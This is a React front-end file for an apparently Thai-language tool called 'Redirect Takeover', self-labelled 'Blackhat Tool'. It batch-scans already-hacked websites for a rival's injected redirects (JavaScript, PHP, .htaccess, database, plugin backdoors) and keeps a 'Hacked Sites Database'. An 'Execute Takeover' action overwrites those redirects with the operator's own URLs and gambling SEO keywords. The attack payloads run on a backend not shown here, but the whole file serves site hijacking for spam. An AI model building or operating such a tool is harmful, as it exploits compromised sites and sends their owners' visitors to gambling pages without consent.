/**
 * ═══════════════════════════════════════════════════════════════
 *  REDIRECT TAKEOVER — Detect & Overwrite Competitor Redirects
 *  
 *  Scan compromised sites to find existing competitor redirects,
 *  then overwrite them with our redirect URLs.
 * ═══════════════════════════════════════════════════════════════
 */
import { useState, useMemo } from "react";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter, DialogDescription } from "@/components/ui/dialog";
import { toast } from "sonner";
import {
  Search,
  Crosshair,
  Shield,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Loader2,
  Globe,
  Code,
  FileCode,
  Database,
  RefreshCw,
  Zap,
  Eye,
  ArrowRight,
  Target,
  Clock,
  BarChart3,
  Skull,
  Copy,
  ExternalLink,
} from "lucide-react";

// ─── Types ───
interface DetectedMethod {
  type: string;
  location: string;
  competitorUrl: string;
  confidence: "high" | "medium" | "low";
  details: string;
  rawSnippet?: string;
}

interface DetectionResult {
  detected: boolean;
  methods: DetectedMethod[];
  competitorUrl: string | null;
  targetPlatform: string | null;
  wpVersion: string | null;
  plugins: string[];
}

interface TakeoverResult {
  success: boolean;
  method: string;
  detail: string;
  overwrittenCompetitorUrl?: string;
  injectedUrl?: string;
}

interface ScanHistoryItem {
  url: string;
  result: DetectionResult;
  scannedAt: Date;
  takeoverAttempted: boolean;
  takeoverResults?: TakeoverResult[];
}

// ─── Method type icons ───
const METHOD_ICONS: Record<string, typeof Code> = {
  js_redirect: Code,
  php_injection: FileCode,
  htaccess: FileCode,
  db_injection: Database,
  meta_refresh: Globe,
  header_redirect: ArrowRight,
  content_replacement: FileCode,
  plugin_backdoor: Shield,
};

const METHOD_LABELS: Record<string, string> = {
  js_redirect: "JavaScript Redirect",
  php_injection: "PHP Injection",
  htaccess: ".htaccess Redirect",
  db_injection: "Database Injection",
  meta_refresh: "Meta Refresh",
  header_redirect: "HTTP Header Redirect",
  content_replacement: "Content Replacement",
  plugin_backdoor: "Plugin Backdoor",
};

const CONFIDENCE_COLORS: Record<string, string> = {
  high: "bg-red-500/20 text-red-400 border-red-500/30",
  medium: "bg-amber-500/20 text-amber-400 border-amber-500/30",
  low: "bg-blue-500/20 text-blue-400 border-blue-500/30",
};

export default function RedirectTakeover() {
  const [activeTab, setActiveTab] = useState("scan");
  const [scanUrl, setScanUrl] = useState("");
  const [batchUrls, setBatchUrls] = useState("");
  const [scanHistory, setScanHistory] = useState<ScanHistoryItem[]>([]);
  const [selectedScan, setSelectedScan] = useState<ScanHistoryItem | null>(null);
  const [takeoverDialog, setTakeoverDialog] = useState(false);
  const [takeoverTarget, setTakeoverTarget] = useState<ScanHistoryItem | null>(null);
  const [selectedRedirectUrl, setSelectedRedirectUrl] = useState("");
  const [seoKeywords, setSeoKeywords] = useState("casino,slot,betting");
  const [batchScanning, setBatchScanning] = useState(false);
  const [batchProgress, setBatchProgress] = useState({ current: 0, total: 0 });
  const [snippetDialog, setSnippetDialog] = useState<{ open: boolean; snippet: string; title: string }>({ open: false, snippet: "", title: "" });

  // ─── Queries ───
  const redirectUrlsQuery = trpc.agenticAttack.listRedirects.useQuery();
  const hackedSitesQuery = trpc.redirectTakeover.listHackedSites.useQuery(undefined, {
    refetchInterval: 30000,
  });

  // ─── Mutations ───
  const detectMutation = trpc.redirectTakeover.detect.useMutation({
    onError: (err) => toast.error("Scan Error", { description: err.message }),
  });

  const executeTakeoverMutation = trpc.redirectTakeover.execute.useMutation({
    onError: (err) => toast.error("Takeover Error", { description: err.message }),
  });

  // ─── Stats ───
  const stats = useMemo(() => {
    const total = scanHistory.length;
    const hacked = scanHistory.filter(s => s.result.detected).length;
    const taken = scanHistory.filter(s => s.takeoverResults?.some(r => r.success)).length;
    return { total, hacked, taken, rate: total > 0 ? Math.round((hacked / total) * 100) : 0 };
  }, [scanHistory]);

  // ─── Single URL Scan ───
  async function handleSingleScan() {
    if (!scanUrl.trim()) {
      toast.error("กรุณาใส่ URL");
      return;
    }
    let url = scanUrl.trim();
    if (!url.startsWith("http")) url = `https://${url}`;

    try {
      const result = await detectMutation.mutateAsync({ targetUrl: url });
      const item: ScanHistoryItem = {
        url,
        result: result as DetectionResult,
        scannedAt: new Date(),
        takeoverAttempted: false,
      };
      setScanHistory(prev => [item, ...prev]);
      setSelectedScan(item);
      
      if (result.detected) {
        toast.success("พบ Redirect ของคู่แข่ง!", {
          description: `${result.methods.length} methods detected → ${result.competitorUrl}`,
        });
      } else {
        toast.info("ไม่พบ redirect ของคู่แข่ง", {
          description: `Platform: ${result.targetPlatform || "unknown"}`,
        });
      }
    } catch {
      // error handled by mutation
    }
  }

  // ─── Batch Scan ───
  async function handleBatchScan() {
    const urls = batchUrls
      .split("\n")
      .map(u => u.trim())
      .filter(u => u.length > 0)
      .map(u => (u.startsWith("http") ? u : `https://${u}`));

    if (urls.length === 0) {
      toast.error("กรุณาใส่ URL อย่างน้อย 1 รายการ");
      return;
    }

    setBatchScanning(true);
    setBatchProgress({ current: 0, total: urls.length });

    for (let i = 0; i < urls.length; i++) {
      setBatchProgress({ current: i + 1, total: urls.length });
      try {
        const result = await detectMutation.mutateAsync({ targetUrl: urls[i] });
        const item: ScanHistoryItem = {
          url: urls[i],
          result: result as DetectionResult,
          scannedAt: new Date(),
          takeoverAttempted: false,
        };
        setScanHistory(prev => [item, ...prev]);
      } catch {
        setScanHistory(prev => [{
          url: urls[i],
          result: { detected: false, methods: [], competitorUrl: null, targetPlatform: null, wpVersion: null, plugins: [] },
          scannedAt: new Date(),
          takeoverAttempted: false,
        }, ...prev]);
      }
      // Small delay between scans
      if (i < urls.length - 1) await new Promise(r => setTimeout(r, 1000));
    }

    setBatchScanning(false);
    toast.success(`Batch Scan เสร็จสิ้น`, {
      description: `สแกน ${urls.length} URLs เรียบร้อย`,
    });
  }

  // ─── Execute Takeover ───
  async function handleExecuteTakeover() {
    if (!takeoverTarget || !selectedRedirectUrl) {
      toast.error("กรุณาเลือก Redirect URL");
      return;
    }

    try {
      const result = await executeTakeoverMutation.mutateAsync({
        targetUrl: takeoverTarget.url,
        ourRedirectUrl: selectedRedirectUrl,
        seoKeywords: seoKeywords.split(",").map(k => k.trim()).filter(Boolean),
      });

      // Update scan history
      setScanHistory(prev =>
        prev.map(item =>
          item.url === takeoverTarget.url
            ? { ...item, takeoverAttempted: true, takeoverResults: result.results as TakeoverResult[] }
            : item
        )
      );

      setTakeoverDialog(false);

      if (result.anySuccess) {
        toast.success("Takeover สำเร็จ!", {
          description: `Overwrite redirect บน ${takeoverTarget.url}`,
        });
      } else {
        toast.warning("Takeover ไม่สำเร็จ", {
          description: "ลองใช้วิธีอื่นหรือเพิ่ม credentials",
        });
      }

      // Refresh hacked sites list
      hackedSitesQuery.refetch();
    } catch {
      // error handled by mutation
    }
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold flex items-center gap-2">
            <Crosshair className="w-6 h-6 text-red-500" />
            Redirect Takeover
          </h1>
          <p className="text-sm text-muted-foreground mt-1">
            ตรวจจับและ overwrite redirect ของคู่แข่งบนเว็บที่ถูก hack แล้ว
          </p>
        </div>
        <div className="flex gap-2">
          <Badge variant="outline" className="border-red-500/30 text-red-400">
            <Skull className="w-3 h-3 mr-1" />
            Blackhat Tool
          </Badge>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground font-mono uppercase">Scanned</p>
                <p className="text-2xl font-bold mt-1">{stats.total}</p>
              </div>
              <Search className="w-5 h-5 text-muted-foreground" />
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground font-mono uppercase">Hacked</p>
                <p className="text-2xl font-bold mt-1 text-red-400">{stats.hacked}</p>
              </div>
              <AlertTriangle className="w-5 h-5 text-red-400" />
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground font-mono uppercase">Taken Over</p>
                <p className="text-2xl font-bold mt-1 text-emerald-400">{stats.taken}</p>
              </div>
              <CheckCircle2 className="w-5 h-5 text-emerald-400" />
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground font-mono uppercase">Detection Rate</p>
                <p className="text-2xl font-bold mt-1 text-amber-400">{stats.rate}%</p>
              </div>
              <BarChart3 className="w-5 h-5 text-amber-400" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Main Content */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="bg-muted/30 border border-border/50">
          <TabsTrigger value="scan" className="data-[state=active]:bg-red-500/20 data-[state=active]:text-red-400">
            <Search className="w-4 h-4 mr-1.5" /> Scan
          </TabsTrigger>
          <TabsTrigger value="batch" className="data-[state=active]:bg-amber-500/20 data-[state=active]:text-amber-400">
            <Target className="w-4 h-4 mr-1.5" /> Batch Scan
          </TabsTrigger>
          <TabsTrigger value="history" className="data-[state=active]:bg-emerald-500/20 data-[state=active]:text-emerald-400">
            <Clock className="w-4 h-4 mr-1.5" /> History
            {scanHistory.length > 0 && (
              <Badge variant="secondary" className="ml-1.5 text-[10px] px-1.5 py-0">{scanHistory.length}</Badge>
            )}
          </TabsTrigger>
          <TabsTrigger value="database" className="data-[state=active]:bg-violet-500/20 data-[state=active]:text-violet-400">
            <Database className="w-4 h-4 mr-1.5" /> Database
          </TabsTrigger>
        </TabsList>

        {/* ─── Single Scan Tab ─── */}
        <TabsContent value="scan" className="space-y-4 mt-4">
          <Card className="bg-card/50 border-border/50">
            <CardHeader className="pb-3">
              <CardTitle className="text-base flex items-center gap-2">
                <Crosshair className="w-4 h-4 text-red-400" />
                Single URL Scan
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex gap-2">
                <Input
                  placeholder="https://example.com หรือ example.com"
                  value={scanUrl}
                  onChange={(e) => setScanUrl(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSingleScan()}
                  className="bg-background/50"
                />
                <Button
                  onClick={handleSingleScan}
                  disabled={detectMutation.isPending}
                  className="bg-red-600 hover:bg-red-700 text-white shrink-0"
                >
                  {detectMutation.isPending ? (
                    <Loader2 className="w-4 h-4 animate-spin mr-1.5" />
                  ) : (
                    <Search className="w-4 h-4 mr-1.5" />
                  )}
                  Scan
                </Button>
              </div>
              <p className="text-xs text-muted-foreground">
                สแกน URL เพื่อตรวจจับ redirect ของคู่แข่ง — รองรับ JS redirect, PHP injection, .htaccess, DB injection, meta refresh, content replacement, plugin backdoor
              </p>
            </CardContent>
          </Card>

          {/* Detection Result */}
          {selectedScan && (
            <DetectionResultCard
              scan={selectedScan}
              onTakeover={() => {
                setTakeoverTarget(selectedScan);
                setTakeoverDialog(true);
              }}
              onViewSnippet={(snippet, title) => setSnippetDialog({ open: true, snippet, title })}
            />
          )}
        </TabsContent>

        {/* ─── Batch Scan Tab ─── */}
        <TabsContent value="batch" className="space-y-4 mt-4">
          <Card className="bg-card/50 border-border/50">
            <CardHeader className="pb-3">
              <CardTitle className="text-base flex items-center gap-2">
                <Target className="w-4 h-4 text-amber-400" />
                Batch URL Scan
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <Textarea
                placeholder={"example1.com\nexample2.com\nhttps://example3.com/page\n..."}
                value={batchUrls}
                onChange={(e) => setBatchUrls(e.target.value)}
                rows={8}
                className="bg-background/50 font-mono text-sm"
              />
              <div className="flex items-center justify-between">
                <p className="text-xs text-muted-foreground">
                  ใส่ URL หนึ่งรายการต่อบรรทัด — สแกนทีละ URL พร้อม delay 1 วินาที
                </p>
                <Button
                  onClick={handleBatchScan}
                  disabled={batchScanning}
                  className="bg-amber-600 hover:bg-amber-700 text-white"
                >
                  {batchScanning ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin mr-1.5" />
                      {batchProgress.current}/{batchProgress.total}
                    </>
                  ) : (
                    <>
                      <Zap className="w-4 h-4 mr-1.5" />
                      Batch Scan
                    </>
                  )}
                </Button>
              </div>
              {batchScanning && (
                <div className="w-full bg-muted/30 rounded-full h-2">
                  <div
                    className="bg-amber-500 h-2 rounded-full transition-all duration-300"
                    style={{ width: `${(batchProgress.current / batchProgress.total) * 100}%` }}
                  />
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ─── History Tab ─── */}
        <TabsContent value="history" className="space-y-3 mt-4">
          {scanHistory.length === 0 ? (
            <Card className="bg-card/50 border-border/50">
              <CardContent className="p-8 text-center">
                <Search className="w-10 h-10 text-muted-foreground mx-auto mb-3" />
                <p className="text-muted-foreground">ยังไม่มีประวัติการสแกน</p>
                <p className="text-xs text-muted-foreground mt-1">เริ่มสแกน URL ที่แท็บ Scan หรือ Batch Scan</p>
              </CardContent>
            </Card>
          ) : (
            scanHistory.map((item, idx) => (
              <Card
                key={`${item.url}-${idx}`}
                className={`bg-card/50 border-border/50 cursor-pointer transition-all hover:border-red-500/30 ${
                  selectedScan?.url === item.url ? "border-red-500/50 ring-1 ring-red-500/20" : ""
                }`}
                onClick={() => {
                  setSelectedScan(item);
                  setActiveTab("scan");
                }}
              >
                <CardContent className="p-4">
                  <div className="flex items-center justify-between gap-3">
                    <div className="flex items-center gap-3 min-w-0">
                      {item.result.detected ? (
                        <div className="w-8 h-8 rounded-lg bg-red-500/20 flex items-center justify-center shrink-0">
                          <AlertTriangle className="w-4 h-4 text-red-400" />
                        </div>
                      ) : (
                        <div className="w-8 h-8 rounded-lg bg-emerald-500/20 flex items-center justify-center shrink-0">
                          <Shield className="w-4 h-4 text-emerald-400" />
                        </div>
                      )}
                      <div className="min-w-0">
                        <p className="text-sm font-medium truncate">{item.url}</p>
                        <div className="flex items-center gap-2 mt-0.5">
                          {item.result.detected ? (
                            <Badge variant="outline" className="text-[10px] border-red-500/30 text-red-400">
                              {item.result.methods.length} redirects found
                            </Badge>
                          ) : (
                            <Badge variant="outline" className="text-[10px] border-emerald-500/30 text-emerald-400">
                              Clean
                            </Badge>
                          )}
                          {item.result.targetPlatform && (
                            <Badge variant="outline" className="text-[10px]">
                              {item.result.targetPlatform}
                            </Badge>
                          )}
                          {item.takeoverAttempted && (
                            <Badge
                              variant="outline"
                              className={`text-[10px] ${
                                item.takeoverResults?.some(r => r.success)
                                  ? "border-emerald-500/30 text-emerald-400"
                                  : "border-amber-500/30 text-amber-400"
                              }`}
                            >
                              {item.takeoverResults?.some(r => r.success) ? "Taken Over" : "Takeover Failed"}
                            </Badge>
                          )}
                        </div>
                      </div>
                    </div>
                    <div className="text-right shrink-0">
                      <p className="text-[10px] text-muted-foreground">
                        {item.scannedAt.toLocaleTimeString("th-TH")}
                      </p>
                      {item.result.detected && !item.takeoverAttempted && (
                        <Button
                          size="sm"
                          variant="outline"
                          className="mt-1 text-xs border-red-500/30 text-red-400 hover:bg-red-500/10"
                          onClick={(e) => {
                            e.stopPropagation();
                            setTakeoverTarget(item);
                            setTakeoverDialog(true);
                          }}
                        >
                          <Crosshair className="w-3 h-3 mr-1" />
                          Takeover
                        </Button>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))
          )}
        </TabsContent>

        {/* ─── Database Tab (Persistent Hacked Sites) ─── */}
        <TabsContent value="database" className="space-y-3 mt-4">
          <Card className="bg-card/50 border-border/50">
            <CardHeader className="pb-3">
              <div className="flex items-center justify-between">
                <CardTitle className="text-base flex items-center gap-2">
                  <Database className="w-4 h-4 text-violet-400" />
                  Hacked Sites Database
                </CardTitle>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => hackedSitesQuery.refetch()}
                  disabled={hackedSitesQuery.isRefetching}
                >
                  <RefreshCw className={`w-3.5 h-3.5 mr-1.5 ${hackedSitesQuery.isRefetching ? "animate-spin" : ""}`} />
                  Refresh
                </Button>
              </div>
            </CardHeader>
            <CardContent>
              {hackedSitesQuery.isLoading ? (
                <div className="flex items-center justify-center py-8">
                  <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
                </div>
              ) : !hackedSitesQuery.data || hackedSitesQuery.data.length === 0 ? (
                <div className="text-center py-8">
                  <Database className="w-10 h-10 text-muted-foreground mx-auto mb-3" />
                  <p className="text-muted-foreground">ยังไม่มีข้อมูล hacked sites</p>
                  <p className="text-xs text-muted-foreground mt-1">สแกน URL แล้วผลลัพธ์จะถูกบันทึกอัตโนมัติ</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {hackedSitesQuery.data.map((site: any) => (
                    <div
                      key={site.id}
                      className="flex items-center justify-between p-3 rounded-lg bg-background/50 border border-border/30 hover:border-red-500/30 transition-colors"
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        <div className={`w-2 h-2 rounded-full shrink-0 ${
                          site.takeoverStatus === "success" ? "bg-emerald-400" :
                          site.takeoverStatus === "failed" ? "bg-red-400" :
                          site.isHacked ? "bg-amber-400 animate-pulse" : "bg-zinc-400"
                        }`} />
                        <div className="min-w-0">
                          <p className="text-sm font-medium truncate">{site.domain}</p>
                          <div className="flex items-center gap-1.5 mt-0.5 flex-wrap">
                            {site.competitorUrl && (
                              <span className="text-[10px] text-red-400 truncate max-w-[200px]">
                                → {site.competitorUrl}
                              </span>
                            )}
                            {site.targetPlatform && (
                              <Badge variant="outline" className="text-[9px] px-1 py-0">{site.targetPlatform}</Badge>
                            )}
                            <Badge
                              variant="outline"
                              className={`text-[9px] px-1 py-0 ${
                                site.takeoverStatus === "success" ? "border-emerald-500/30 text-emerald-400" :
                                site.takeoverStatus === "failed" ? "border-red-500/30 text-red-400" :
                                site.takeoverStatus === "in_progress" ? "border-amber-500/30 text-amber-400" :
                                "border-border/50"
                              }`}
                            >
                              {site.takeoverStatus}
                            </Badge>
                            <Badge variant="outline" className="text-[9px] px-1 py-0">
                              P{site.priority}
                            </Badge>
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <span className="text-[10px] text-muted-foreground">
                          {new Date(site.scannedAt).toLocaleDateString("th-TH")}
                        </span>
                        {site.isHacked && site.takeoverStatus === "not_attempted" && (
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-xs border-red-500/30 text-red-400 hover:bg-red-500/10"
                            onClick={() => {
                              setTakeoverTarget({
                                url: site.url,
                                result: {
                                  detected: true,
                                  methods: site.detectionMethods || [],
                                  competitorUrl: site.competitorUrl,
                                  targetPlatform: site.targetPlatform,
                                  wpVersion: site.wpVersion,
                                  plugins: site.plugins || [],
                                },
                                scannedAt: new Date(site.scannedAt),
                                takeoverAttempted: false,
                              });
                              setTakeoverDialog(true);
                            }}
                          >
                            <Crosshair className="w-3 h-3 mr-1" />
                            Takeover
                          </Button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>

      {/* ─── Takeover Dialog ─── */}
      <Dialog open={takeoverDialog} onOpenChange={setTakeoverDialog}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Crosshair className="w-5 h-5 text-red-400" />
              Execute Redirect Takeover
            </DialogTitle>
            <DialogDescription>
              Overwrite redirect ของคู่แข่งบน {takeoverTarget?.url}
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            {takeoverTarget?.result.competitorUrl && (
              <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/20">
                <p className="text-xs text-red-400 font-mono">
                  Competitor: {takeoverTarget.result.competitorUrl}
                </p>
              </div>
            )}
            <div>
              <label className="text-sm font-medium mb-1.5 block">Redirect URL ของเรา</label>
              <Select value={selectedRedirectUrl} onValueChange={setSelectedRedirectUrl}>
                <SelectTrigger className="bg-background/50">
                  <SelectValue placeholder="เลือก Redirect URL..." />
                </SelectTrigger>
                <SelectContent>
                  {redirectUrlsQuery.data?.map((url: any) => (
                    <SelectItem key={url.id} value={url.url}>
                      {url.label || url.url} {url.isDefault && "(Default)"}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div>
              <label className="text-sm font-medium mb-1.5 block">SEO Keywords</label>
              <Input
                value={seoKeywords}
                onChange={(e) => setSeoKeywords(e.target.value)}
                placeholder="casino,slot,betting"
                className="bg-background/50"
              />
              <p className="text-[10px] text-muted-foreground mt-1">คั่นด้วยเครื่องหมายจุลภาค</p>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setTakeoverDialog(false)}>
              ยกเลิก
            </Button>
            <Button
              onClick={handleExecuteTakeover}
              disabled={executeTakeoverMutation.isPending || !selectedRedirectUrl}
              className="bg-red-600 hover:bg-red-700 text-white"
            >
              {executeTakeoverMutation.isPending ? (
                <Loader2 className="w-4 h-4 animate-spin mr-1.5" />
              ) : (
                <Zap className="w-4 h-4 mr-1.5" />
              )}
              Execute Takeover
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ─── Snippet Dialog ─── */}
      <Dialog open={snippetDialog.open} onOpenChange={(open) => setSnippetDialog(prev => ({ ...prev, open }))}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Code className="w-4 h-4 text-amber-400" />
              {snippetDialog.title}
            </DialogTitle>
          </DialogHeader>
          <div className="relative">
            <pre className="bg-zinc-900 rounded-lg p-4 text-xs text-zinc-300 overflow-x-auto max-h-[400px] overflow-y-auto font-mono whitespace-pre-wrap break-all">
              {snippetDialog.snippet}
            </pre>
            <Button
              size="sm"
              variant="outline"
              className="absolute top-2 right-2"
              onClick={() => {
                navigator.clipboard.writeText(snippetDialog.snippet);
                toast.success("Copied!");
              }}
            >
              <Copy className="w-3 h-3" />
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}

// ─── Detection Result Card Component ───
function DetectionResultCard({
  scan,
  onTakeover,
  onViewSnippet,
}: {
  scan: ScanHistoryItem;
  onTakeover: () => void;
  onViewSnippet: (snippet: string, title: string) => void;
}) {
  const { result } = scan;

  return (
    <Card className={`border-border/50 ${result.detected ? "bg-red-500/5 border-red-500/20" : "bg-emerald-500/5 border-emerald-500/20"}`}>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <CardTitle className="text-base flex items-center gap-2">
            {result.detected ? (
              <>
                <AlertTriangle className="w-5 h-5 text-red-400" />
                <span className="text-red-400">Competitor Redirect Detected</span>
              </>
            ) : (
              <>
                <Shield className="w-5 h-5 text-emerald-400" />
                <span className="text-emerald-400">No Competitor Redirect Found</span>
              </>
            )}
          </CardTitle>
          {result.detected && !scan.takeoverAttempted && (
            <Button
              size="sm"
              className="bg-red-600 hover:bg-red-700 text-white"
              onClick={onTakeover}
            >
              <Crosshair className="w-3.5 h-3.5 mr-1.5" />
              Takeover
            </Button>
          )}
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Target Info */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <div className="p-2.5 rounded-lg bg-background/50 border border-border/30">
            <p className="text-[10px] text-muted-foreground font-mono uppercase">URL</p>
            <p className="text-xs font-medium mt-0.5 truncate">{scan.url}</p>
          </div>
          <div className="p-2.5 rounded-lg bg-background/50 border border-border/30">
            <p className="text-[10px] text-muted-foreground font-mono uppercase">Platform</p>
            <p className="text-xs font-medium mt-0.5">{result.targetPlatform || "Unknown"}</p>
          </div>
          {result.wpVersion && (
            <div className="p-2.5 rounded-lg bg-background/50 border border-border/30">
              <p className="text-[10px] text-muted-foreground font-mono uppercase">WP Version</p>
              <p className="text-xs font-medium mt-0.5">{result.wpVersion}</p>
            </div>
          )}
          {result.competitorUrl && (
            <div className="p-2.5 rounded-lg bg-red-500/10 border border-red-500/20">
              <p className="text-[10px] text-red-400 font-mono uppercase">Competitor</p>
              <p className="text-xs font-medium mt-0.5 text-red-400 truncate">{result.competitorUrl}</p>
            </div>
          )}
        </div>

        {/* Detected Methods */}
        {result.methods.length > 0 && (
          <div>
            <p className="text-sm font-medium mb-2">Detected Methods ({result.methods.length})</p>
            <div className="space-y-2">
              {result.methods.map((method, idx) => {
                const Icon = METHOD_ICONS[method.type] || Code;
                return (
                  <div
                    key={idx}
                    className="p-3 rounded-lg bg-background/50 border border-border/30 hover:border-red-500/20 transition-colors"
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex items-start gap-2.5">
                        <div className="w-7 h-7 rounded bg-red-500/15 flex items-center justify-center shrink-0 mt-0.5">
                          <Icon className="w-3.5 h-3.5 text-red-400" />
                        </div>
                        <div>
                          <div className="flex items-center gap-2">
                            <p className="text-sm font-medium">{METHOD_LABELS[method.type] || method.type}</p>
                            <Badge
                              variant="outline"
                              className={`text-[9px] px-1.5 py-0 ${CONFIDENCE_COLORS[method.confidence]}`}
                            >
                              {method.confidence}
                            </Badge>
                          </div>
                          <p className="text-xs text-muted-foreground mt-0.5">{method.details}</p>
                          <p className="text-[10px] text-muted-foreground mt-0.5 font-mono">
                            Location: {method.location}
                          </p>
                          <p className="text-[10px] text-red-400 mt-0.5 font-mono truncate max-w-[400px]">
                            → {method.competitorUrl}
                          </p>
                        </div>
                      </div>
                      {method.rawSnippet && (
                        <Button
                          size="sm"
                          variant="ghost"
                          className="shrink-0"
                          onClick={() => onViewSnippet(method.rawSnippet!, METHOD_LABELS[method.type] || method.type)}
                        >
                          <Eye className="w-3.5 h-3.5" />
                        </Button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* Plugins */}
        {result.plugins.length > 0 && (
          <div>
            <p className="text-sm font-medium mb-2">Detected Plugins ({result.plugins.length})</p>
            <div className="flex flex-wrap gap-1.5">
              {result.plugins.map((plugin, idx) => (
                <Badge key={idx} variant="outline" className="text-[10px]">
                  {plugin}
                </Badge>
              ))}
            </div>
          </div>
        )}

        {/* Takeover Results */}
        {scan.takeoverAttempted && scan.takeoverResults && (
          <div>
            <p className="text-sm font-medium mb-2">Takeover Results</p>
            <div className="space-y-1.5">
              {scan.takeoverResults.map((result, idx) => (
                <div
                  key={idx}
                  className={`flex items-center gap-2.5 p-2.5 rounded-lg border ${
                    result.success
                      ? "bg-emerald-500/10 border-emerald-500/20"
                      : "bg-zinc-500/5 border-border/30"
                  }`}
                >
                  {result.success ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  ) : (
                    <XCircle className="w-4 h-4 text-zinc-500 shrink-0" />
                  )}
                  <div className="min-w-0">
                    <p className="text-xs font-medium">{result.method}</p>
                    <p className="text-[10px] text-muted-foreground truncate">{result.detail}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}
